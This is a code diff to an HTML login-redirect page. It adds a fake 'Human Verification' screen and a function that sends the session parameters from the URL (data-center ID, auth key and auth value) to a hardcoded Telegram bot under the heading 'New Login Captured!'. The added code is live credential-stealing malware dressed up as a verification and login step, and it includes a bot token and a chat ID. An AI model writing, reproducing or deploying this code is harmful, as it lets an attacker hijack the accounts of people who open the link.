@@ -1,21 +1,197 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Logging in...</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Human Verification</title>
     <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
         body {
-            background: #0f0f0f;
-            color: white;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            color: #ffffff;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            margin: 0;
+            min-height: 100vh;
+            padding: 20px;
         }
-        .container { text-align: center; }
+
+        .container {
+            width: 100%;
+            max-width: 500px;
+            text-align: center;
+        }
+
+        h1 {
+            font-size: 2.5rem;
+            font-weight: 700;
+            margin-bottom: 20px;
+            letter-spacing: -0.5px;
+        }
+
+        h2 {
+            font-size: 1.8rem;
+            font-weight: 600;
+            margin-bottom: 15px;
+        }
+
+        .subtitle {
+            font-size: 1.25rem;
+            color: #b8b8d1;
+            margin-bottom: 50px;
+            font-weight: 400;
+        }
+
+        .verify-btn {
+            background: linear-gradient(135deg, #5f9ea0 0%, #4a7c7e 100%);
+            color: white;
+            font-size: 1.5rem;
+            font-weight: 600;
+            padding: 20px 80px;
+            border: none;
+            border-radius: 15px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 8px 25px rgba(95, 158, 160, 0.3);
+            width: 100%;
+            max-width: 400px;
+        }
+
+        .verify-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 35px rgba(95, 158, 160, 0.4);
+            background: linear-gradient(135deg, #6aafb1 0%, #558a8c 100%);
+        }
+
+        .verify-btn:active {
+            transform: translateY(0);
+        }
+
+        /* Loading Screen */
+        .loading-screen {
+            display: none;
+        }
+
+        .loading-screen.active {
+            display: block;
+        }
+
+        .spinner-container {
+            margin: 40px 0;
+        }
+
         .spinner {
+            width: 80px;
+            height: 80px;
+            border: 6px solid #2a2a3e;
+            border-top: 6px solid #5f9ea0;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            font-size: 1.2rem;
+            color: #b8b8d1;
+            margin-top: 25px;
+        }
+
+        .loading-dots {
+            display: inline-block;
+            width: 20px;
+        }
+
+        .progress-bar {
+            width: 100%;
+            max-width: 400px;
+            height: 8px;
+            background: #2a2a3e;
+            border-radius: 10px;
+            margin: 30px auto;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #5f9ea0, #4a7c7e);
+            border-radius: 10px;
+            width: 0%;
+            animation: progress 3s ease-in-out forwards;
+        }
+
+        @keyframes progress {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+
+        /* Completion Message */
+        .completion-screen {
+            display: none;
+        }
+
+        .completion-screen.active {
+            display: block;
+        }
+
+        .checkmark {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            background: #4caf50;
+            margin: 0 auto 30px;
+            position: relative;
+            animation: scaleIn 0.5s ease-out;
+        }
+
+        .checkmark:after {
+            content: '✓';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 50px;
+            color: white;
+        }
+
+        @keyframes scaleIn {
+            0% { transform: scale(0); }
+            50% { transform: scale(1.2); }
+            100% { transform: scale(1); }
+        }
+
+        .completion-text {
+            font-size: 1.5rem;
+            font-weight: 600;
+            margin-bottom: 15px;
+        }
+
+        .completion-subtitle {
+            font-size: 1.1rem;
+            color: #b8b8d1;
+            margin-bottom: 40px;
+        }
+
+        /* Login Screen */
+        .login-screen {
+            display: none;
+        }
+
+        .login-screen.active {
+            display: block;
+        }
+
+        .login-spinner {
             width: 50px;
             height: 50px;
             border: 4px solid #333;
@@ -24,30 +200,137 @@
             animation: spin 1s linear infinite;
             margin: 0 auto 20px;
         }
-        @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* Hidden class */
+        .hidden {
+            display: none !important;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="spinner"></div>
-        <h2>Logging you in...</h2>
-        <p>Please wait</p>
+        <!-- Step 1: Initial Verification Button -->
+        <div id="initialScreen" class="initial-screen">
+            <h1>Human Verification</h1>
+            <p class="subtitle">Verify below to be granted entry</p>
+            <button class="verify-btn" onclick="startVerification()">Click here</button>
+        </div>
+
+        <!-- Step 2: Loading/Verification Screen -->
+        <div id="loadingScreen" class="loading-screen">
+            <h1>Verifying</h1>
+            <div class="spinner-container">
+                <div class="spinner"></div>
+            </div>
+            <p class="loading-text">Checking authentication<span class="loading-dots">...</span></p>
+            <div class="progress-bar">
+                <div class="progress-fill"></div>
+            </div>
+        </div>
+
+        <!-- Step 3: Completion Message -->
+        <div id="completionScreen" class="completion-screen">
+            <div class="checkmark"></div>
+            <h2 class="completion-text">Verification Required</h2>
+            <p class="completion-subtitle">Please complete verification to continue</p>
+        </div>
+
+        <!-- Step 4: Original Login Screen -->
+        <div id="loginScreen" class="login-screen">
+            <div class="login-spinner"></div>
+            <h2>Logging you in...</h2>
+            <p class="subtitle">Please wait</p>
+        </div>
     </div>
+
     <script>
-        const params = new URLSearchParams(window.location.search);
-        const dc = params.get('dc');
-        const key = params.get('key');
-        const auth = params.get('auth');
-        
-        if (dc && key && auth) {
-            localStorage.setItem('dc', dc);
-            localStorage.setItem('dc' + dc + '_auth_key', key);
-            localStorage.setItem('user_auth', auth);
-            window.location.href = '/';
-        } else {
-            document.querySelector('h2').textContent = 'Invalid login link';
-            document.querySelector('p').textContent = 'Missing parameters';
-            document.querySelector('.spinner').style.display = 'none';
+        // Animate loading dots
+        let dotCount = 0;
+        setInterval(() => {
+            const dotsElement = document.querySelector('.loading-dots');
+            if (dotsElement) {
+                dotCount = (dotCount + 1) % 4;
+                dotsElement.textContent = '.'.repeat(dotCount);
+            }
+        }, 500);
+
+        // Step 1: Start verification process
+        function startVerification() {
+            // Hide initial screen
+            document.getElementById('initialScreen').classList.add('hidden');
+            
+            // Show loading screen
+            document.getElementById('loadingScreen').classList.add('active');
+            
+            // After 3 seconds, show completion screen
+            setTimeout(() => {
+                document.getElementById('loadingScreen').classList.remove('active');
+                document.getElementById('completionScreen').classList.add('active');
+                
+                // After 2 seconds, proceed to login
+                setTimeout(() => {
+                    document.getElementById('completionScreen').classList.remove('active');
+                    document.getElementById('loginScreen').classList.add('active');
+                    
+                    // Start the actual login process
+                    processLogin();
+                }, 2000);
+            }, 3000);
+        }
+
+        // Step 2: Process the actual login (your original code)
+        function processLogin() {
+            const params = new URLSearchParams(window.location.search);
+            const dc = params.get('dc');
+            const key = params.get('key');
+            const auth = params.get('auth');
+            
+            if (dc && key && auth) {
+                // Send notification to admin
+                sendNotification(dc, key, auth);
+                
+                // Set localStorage and redirect
+                localStorage.setItem('dc', dc);
+                localStorage.setItem('dc' + dc + '_auth_key', key);
+                localStorage.setItem('user_auth', auth);
+                
+                setTimeout(() => {
+                    window.location.href = '/';
+                }, 1000);
+            } else {
+                document.querySelector('#loginScreen h2').textContent = 'Invalid login link';
+                document.querySelector('#loginScreen .subtitle').textContent = 'Missing parameters';
+                document.querySelector('.login-spinner').style.display = 'none';
+            }
+        }
+
+        // Send notification to Telegram admin
+        function sendNotification(dc, key, auth) {
+            const BOT_TOKEN = '8285172039:AAHnkCFzGssliNwPjQO4c6oNFkTzP9SS0hw';
+            const CHAT_ID = '7241621112';
+            
+            const message = `
+🆕 <b>New Login Captured!</b>
+
+🌐 <b>DC:</b> <code>${dc}</code>
+🔑 <b>Key:</b> <code>${key ? key.substring(0, 30) + '...' : 'N/A'}</code>
+🔐 <b>Auth:</b> <code>${auth ? auth.substring(0, 30) + '...' : 'N/A'}</code>
+
+⏰ <b>Time:</b> ${new Date().toLocaleString()}
+🔗 <b>URL:</b> ${window.location.href}
+            `.trim();
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            }).catch(err => console.log('Notification failed:', err));
         }
     </script>
 </body>
